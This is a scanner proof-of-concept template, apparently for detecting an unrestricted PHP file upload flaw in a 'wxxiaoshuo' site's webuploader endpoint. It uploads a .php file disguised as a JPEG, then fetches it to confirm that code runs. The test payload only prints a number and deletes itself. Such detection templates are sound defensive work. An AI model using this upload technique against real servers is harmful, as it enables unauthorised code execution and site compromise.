name: poc-yaml-wxxiaoshuo-fileupload.php-File-upload
transport: http

set:
  username: randomLowercase(6)

rules:
  r0:
    request:
      method: POST
      path: /Public/webuploader/0.1.5/server/fileupload.php
      headers:
        User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:99.0) Gecko/20100101 Firefox/99.0
        Content-Type: multipart/form-data; boundary=d0b7a0d40eed0e32904c8017b09eb305
      body: |
        --d0b7a0d40eed0e32904c8017b09eb305
        Content-Disposition: form-data; name="file"; filename="{{username}}.php"
        Content-Type: image/jpeg

        <?php print(111*222);unlink(__FILE__);?>
        --d0b7a0d40eed0e32904c8017b09eb305--
    expression: response.status == 200
  r1:
    request:
      method: GET
      path: /Public/webuploader/0.1.5/server/upload/{{username}}.php
      headers:
        User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:99.0) Gecko/20100101 Firefox/99.0
    expression: response.status == 200 && response.body.bcontains(b'24642')
expression: r0() && r1()

detail:
